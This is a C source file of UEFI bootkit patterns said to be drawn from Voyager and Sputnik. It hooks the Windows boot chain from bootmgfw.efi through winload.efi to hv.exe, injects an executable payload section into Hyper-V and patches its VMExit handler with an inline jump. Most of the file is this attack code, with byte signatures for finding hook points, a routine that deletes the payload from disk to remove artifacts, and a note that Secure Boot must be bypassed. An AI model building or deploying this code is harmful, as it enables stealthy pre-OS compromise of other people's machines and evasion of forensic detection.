/**
 * Boot Chain Hooking Patterns
 * Extracted from: Voyager, Sputnik, EfiGuard, UEFI-Bootkit
 *
 * These patterns demonstrate Windows boot chain interception for
 * pre-OS hypervisor/payload injection.
 */

#include <stdint.h>

/* EFI Types */
typedef uint64_t EFI_STATUS;
typedef void* EFI_HANDLE;
typedef void* EFI_SYSTEM_TABLE;

#define EFI_SUCCESS             0
#define EFI_INVALID_PARAMETER   2

/**
 * Boot Chain Overview:
 *
 * 1. UEFI Firmware
 *    └─> 2. bootmgfw.efi (Windows Boot Manager)
 *        └─> 3. winload.efi (Windows Loader)
 *            └─> 4. hvloader.efi (Hyper-V Loader, if VBS enabled)
 *                └─> 5. hv.exe (Hyper-V)
 *                └─> 6. ntoskrnl.exe (Windows Kernel)
 *
 * Injection points:
 * - Hook bootmgfw.efi: ArchStartBootApplication
 * - Hook winload.efi: BlLdrLoadImage / BlImgLoadPEImageEx
 * - Hook hvloader.efi: HvBlImgAllocateImageBuffer
 * - Patch hv.exe: VMExit handler
 */

/**
 * Pattern 1: UEFI Entry Point (from Voyager/Sputnik)
 *
 * Source: Voyager/UefiMain.cpp
 */
typedef EFI_STATUS (*PEFI_IMAGE_START)(EFI_HANDLE, EFI_SYSTEM_TABLE*);
typedef EFI_STATUS (*PLOAD_IMAGE)(EFI_HANDLE, void*, void*, uint64_t, EFI_HANDLE*);

static EFI_HANDLE g_BootMgfwHandle = NULL;
static PLOAD_IMAGE g_OriginalLoadImage = NULL;

EFI_STATUS UefiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable)
{
    EFI_STATUS status;

    /* 1. Restore original bootmgfw if we replaced it */
    status = RestoreBootMgfw();
    if (status != EFI_SUCCESS) {
        return status;
    }

    /* 2. Load our payload from disk */
    void* PayLoad = NULL;
    uint64_t PayLoadSize = 0;
    status = LoadPayLoadFromDisk(&PayLoad, &PayLoadSize);
    if (status != EFI_SUCCESS) {
        return status;
    }

    /* 3. Hook boot services to intercept bootmgfw loading */
    g_OriginalLoadImage = SystemTable->BootServices->LoadImage;
    SystemTable->BootServices->LoadImage = HookedLoadImage;

    /* 4. Start the real bootmgfw */
    status = SystemTable->BootServices->StartImage(g_BootMgfwHandle, NULL, NULL);

    return status;
}

/**
 * Pattern 2: ArchStartBootApplication Hook (from Voyager)
 *
 * Source: Voyager/BootMgfw.cpp
 *
 * Intercept when bootmgfw.efi loads winload.efi.
 */
typedef EFI_STATUS (*ARCH_START_BOOT_APPLICATION)(void*, void*, uint32_t, uint8_t);

static ARCH_START_BOOT_APPLICATION g_OrigArchStartBootApplication = NULL;

/* Signature to find ArchStartBootApplication */
static const uint8_t ARCH_START_SIG[] = {
    0x48, 0x8B, 0xC4,                   /* mov rax, rsp */
    0x48, 0x89, 0x58, 0x20,             /* mov [rax+20h], rbx */
    0x44, 0x89, 0x40, 0x18,             /* mov [rax+18h], r8d */
    0x48, 0x89, 0x50, 0x10,             /* mov [rax+10h], rdx */
    0x48, 0x89, 0x48, 0x08              /* mov [rax+8], rcx */
};

static EFI_STATUS HookedArchStartBootApplication(
    void* AppEntry,
    void* ImageBase,
    uint32_t ImageSize,
    uint8_t BootOption)
{
    /* Check if this is winload.efi being loaded */
    if (IsWinload(ImageBase, ImageSize)) {
        /* Install winload hooks before it executes */
        InstallWinloadHooks(ImageBase, ImageSize);
    }

    /* Call original function */
    return g_OrigArchStartBootApplication(AppEntry, ImageBase, ImageSize, BootOption);
}

/**
 * Pattern 3: BlLdrLoadImage Hook (from Voyager)
 *
 * Source: Voyager/WinLoad.cpp
 *
 * Intercept image loading in winload.efi (Windows 10 1709+).
 */
typedef EFI_STATUS (*BL_LDR_LOAD_IMAGE)(
    void* ListEntry,
    wchar_t* ModuleName,
    wchar_t* ModulePath,
    void* Unknown1,
    void* Unknown2,
    void* Unknown3,
    void* Unknown4,
    void** ImageBase,
    uint32_t* ImageSize,
    void* Unknown5,
    void* Unknown6,
    void* Unknown7,
    void* Unknown8
);

static BL_LDR_LOAD_IMAGE g_OrigBlLdrLoadImage = NULL;
static int g_HyperVLoading = 0;

static EFI_STATUS HookedBlLdrLoadImage(
    void* ListEntry,
    wchar_t* ModuleName,
    wchar_t* ModulePath,
    void* Unknown1,
    void* Unknown2,
    void* Unknown3,
    void* Unknown4,
    void** ImageBase,
    uint32_t* ImageSize,
    void* Unknown5,
    void* Unknown6,
    void* Unknown7,
    void* Unknown8)
{
    EFI_STATUS status = g_OrigBlLdrLoadImage(
        ListEntry, ModuleName, ModulePath,
        Unknown1, Unknown2, Unknown3, Unknown4,
        ImageBase, ImageSize,
        Unknown5, Unknown6, Unknown7, Unknown8);

    if (status != EFI_SUCCESS) {
        return status;
    }

    /* Check if Hyper-V is being loaded */
    if (wcsstr(ModuleName, L"hv.exe") != NULL) {
        g_HyperVLoading = 1;

        /* Inject our payload into hv.exe */
        InjectPayloadIntoHv(*ImageBase, *ImageSize);
    }

    /* Check for hvloader.efi */
    if (wcsstr(ModuleName, L"hvloader.efi") != NULL) {
        /* Install hvloader hooks */
        InstallHvLoaderHooks(*ImageBase, *ImageSize);
    }

    return status;
}

/**
 * Pattern 4: BlImgLoadPEImageEx Hook (from Sputnik)
 *
 * Source: Sputnik/WinLoad.cpp
 *
 * Alternative hook point for older Windows versions (<1703).
 */
typedef EFI_STATUS (*BL_IMG_LOAD_PE_IMAGE_EX)(
    void* Unknown1,
    void* Unknown2,
    wchar_t* ImagePath,
    void** ImageBase,
    uint32_t* ImageSize,
    void* Unknown3,
    void* Unknown4,
    void* Unknown5,
    void* Unknown6,
    void* Unknown7,
    void* Unknown8,
    void* Unknown9,
    void* Unknown10,
    void* Unknown11
);

/**
 * Pattern 5: HvBlImgAllocateImageBuffer Hook (from Voyager)
 *
 * Source: Voyager/HvLoader.cpp
 *
 * Hook hvloader.efi to intercept hv.exe allocation.
 */
typedef EFI_STATUS (*HV_BL_IMG_ALLOCATE_IMAGE_BUFFER)(
    void** ImageBuffer,
    uint64_t ImageSize,
    uint32_t Flags,
    void* Unknown1,
    void* Unknown2
);

static HV_BL_IMG_ALLOCATE_IMAGE_BUFFER g_OrigHvBlImgAllocate = NULL;
static void* g_HvImageBase = NULL;
static uint64_t g_HvImageSize = 0;

static EFI_STATUS HookedHvBlImgAllocateImageBuffer(
    void** ImageBuffer,
    uint64_t ImageSize,
    uint32_t Flags,
    void* Unknown1,
    void* Unknown2)
{
    EFI_STATUS status = g_OrigHvBlImgAllocate(
        ImageBuffer, ImageSize, Flags, Unknown1, Unknown2);

    if (status == EFI_SUCCESS) {
        /* Save hv.exe base and size for later patching */
        g_HvImageBase = *ImageBuffer;
        g_HvImageSize = ImageSize;
    }

    return status;
}

/**
 * Pattern 6: PE Section Addition (from Voyager/Sputnik)
 *
 * Source: Voyager/PayLoad/PeUtils.cpp
 *
 * Add new section to hv.exe for payload injection.
 */
typedef struct {
    char Name[8];
    uint32_t VirtualSize;
    uint32_t VirtualAddress;
    uint32_t SizeOfRawData;
    uint32_t PointerToRawData;
    uint32_t PointerToRelocations;
    uint32_t PointerToLinenumbers;
    uint16_t NumberOfRelocations;
    uint16_t NumberOfLinenumbers;
    uint32_t Characteristics;
} IMAGE_SECTION_HEADER;

#define IMAGE_SCN_MEM_EXECUTE   0x20000000
#define IMAGE_SCN_MEM_READ      0x40000000
#define IMAGE_SCN_MEM_WRITE     0x80000000

static int AddPayloadSection(void* ImageBase, void* Payload, uint64_t PayloadSize)
{
    /* Get DOS/NT headers */
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)ImageBase;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)((uint8_t*)ImageBase + dos->e_lfanew);

    /* Get section headers */
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)(
        (uint8_t*)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);

    /* Find last section */
    IMAGE_SECTION_HEADER* lastSection = &sections[nt->FileHeader.NumberOfSections - 1];

    /* Calculate new section address */
    uint32_t newSectionVA = ALIGN_UP(
        lastSection->VirtualAddress + lastSection->VirtualSize,
        nt->OptionalHeader.SectionAlignment);

    /* Add new section header */
    IMAGE_SECTION_HEADER* newSection = &sections[nt->FileHeader.NumberOfSections];
    memcpy(newSection->Name, "payload", 8);
    newSection->VirtualSize = PayloadSize;
    newSection->VirtualAddress = newSectionVA;
    newSection->SizeOfRawData = ALIGN_UP(PayloadSize, nt->OptionalHeader.FileAlignment);
    newSection->PointerToRawData = 0;  /* Will be calculated */
    newSection->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;

    /* Update header count */
    nt->FileHeader.NumberOfSections++;

    /* Update image size */
    nt->OptionalHeader.SizeOfImage = ALIGN_UP(
        newSectionVA + PayloadSize,
        nt->OptionalHeader.SectionAlignment);

    /* Copy payload to new section */
    memcpy((uint8_t*)ImageBase + newSectionVA, Payload, PayloadSize);

    return 0;
}

/**
 * Pattern 7: VMExit Handler Hook in hv.exe (from Voyager/Sputnik)
 *
 * Source: Sputnik/PayLoad/Hv.cpp
 *
 * Patch hv.exe's VMExit handler to redirect to our code.
 */

/* Signature for Intel VMExit handler in hv.exe */
static const uint8_t INTEL_VMEXIT_SIG[] = {
    0x48, 0x89, 0x5C, 0x24, 0x08,       /* mov [rsp+8], rbx */
    0x48, 0x89, 0x6C, 0x24, 0x10,       /* mov [rsp+10h], rbp */
    0x48, 0x89, 0x74, 0x24, 0x18,       /* mov [rsp+18h], rsi */
    0x57,                               /* push rdi */
    0x48, 0x83, 0xEC, 0x20              /* sub rsp, 20h */
};

/* Signature for AMD VMExit handler in hv.exe */
static const uint8_t AMD_VMEXIT_SIG[] = {
    0x40, 0x53,                         /* push rbx */
    0x56,                               /* push rsi */
    0x48, 0x83, 0xEC, 0x28              /* sub rsp, 28h */
};

typedef void (*VMEXIT_HANDLER)(void* GuestContext);

static int HookVmExit(void* HvBase, uint64_t HvSize, VMEXIT_HANDLER NewHandler)
{
    void* vmexitHandler = NULL;

    /* Search for Intel VMExit handler */
    vmexitHandler = FindPattern(HvBase, HvSize, INTEL_VMEXIT_SIG, sizeof(INTEL_VMEXIT_SIG));

    if (!vmexitHandler) {
        /* Try AMD pattern */
        vmexitHandler = FindPattern(HvBase, HvSize, AMD_VMEXIT_SIG, sizeof(AMD_VMEXIT_SIG));
    }

    if (!vmexitHandler) {
        return -1;  /* Pattern not found */
    }

    /*
     * Install hook at VMExit handler.
     * Replace first instructions with jump to our handler.
     */
    uint8_t hookBytes[] = {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  /* mov rax, addr */
        0xFF, 0xE0                                                    /* jmp rax */
    };

    *(uint64_t*)(&hookBytes[2]) = (uint64_t)NewHandler;

    memcpy(vmexitHandler, hookBytes, sizeof(hookBytes));

    return 0;
}

/**
 * Pattern 8: Payload Self-Deletion (from Voyager)
 *
 * Source: Voyager/UefiMain.cpp
 *
 * Delete payload file from disk after loading.
 */
static EFI_STATUS DeletePayloadFile(EFI_HANDLE ImageHandle)
{
    EFI_LOADED_IMAGE_PROTOCOL* loadedImage;
    EFI_SIMPLE_FILE_SYSTEM_PROTOCOL* fs;
    EFI_FILE_PROTOCOL* root;
    EFI_FILE_PROTOCOL* payloadFile;

    /* Get file system */
    EFI_STATUS status = gBS->HandleProtocol(
        ImageHandle,
        &gEfiLoadedImageProtocolGuid,
        (void**)&loadedImage);

    if (status != EFI_SUCCESS) return status;

    status = gBS->HandleProtocol(
        loadedImage->DeviceHandle,
        &gEfiSimpleFileSystemProtocolGuid,
        (void**)&fs);

    if (status != EFI_SUCCESS) return status;

    /* Open root directory */
    status = fs->OpenVolume(fs, &root);
    if (status != EFI_SUCCESS) return status;

    /* Open payload file */
    status = root->Open(root, &payloadFile, L"\\EFI\\Boot\\payload.efi",
                        EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);

    if (status == EFI_SUCCESS) {
        /* Delete the file */
        payloadFile->Delete(payloadFile);
    }

    root->Close(root);

    return EFI_SUCCESS;
}

/**
 * Pattern 9: Inline Hook Template (from Sputnik)
 *
 * Source: Sputnik/Util/Util.cpp
 *
 * 12-byte faux call hook for x64.
 */
static const uint8_t INLINE_HOOK_TEMPLATE[] = {
    0x50,                                                           /* push rax */
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     /* mov rax, addr */
    0x48, 0x87, 0x04, 0x24,                                         /* xchg [rsp], rax */
    0xC3                                                            /* ret */
};

static int MakeInlineHook(void* Target, void* Handler, uint8_t* OriginalBytes)
{
    /* Save original bytes */
    memcpy(OriginalBytes, Target, sizeof(INLINE_HOOK_TEMPLATE));

    /* Build hook */
    uint8_t hook[sizeof(INLINE_HOOK_TEMPLATE)];
    memcpy(hook, INLINE_HOOK_TEMPLATE, sizeof(hook));
    *(uint64_t*)(&hook[3]) = (uint64_t)Handler;

    /* Install hook */
    memcpy(Target, hook, sizeof(hook));

    return 0;
}

/*
 * Usage Notes:
 *
 * 1. Boot Chain Hook Flow:
 *    a. UEFI driver loads, hooks BootServices->LoadImage
 *    b. Intercept bootmgfw.efi load, hook ArchStartBootApplication
 *    c. When winload.efi loads, hook BlLdrLoadImage
 *    d. When hv.exe loads, add payload section and hook VMExit
 *    e. Delete payload file from disk
 *    f. Let boot continue normally
 *
 * 2. Key Points:
 *    - Must handle both VBS-enabled and non-VBS boots
 *    - Pattern signatures vary by Windows version
 *    - Maintain signature database per Windows build
 *    - Test on multiple Windows versions
 *
 * 3. Security Considerations:
 *    - Secure Boot must be bypassed or MOK enrolled
 *    - Self-deletion removes disk artifacts
 *    - Memory-only after boot completes
 *
 * Critical: Boot chain hooking requires extensive Windows version testing.
 */
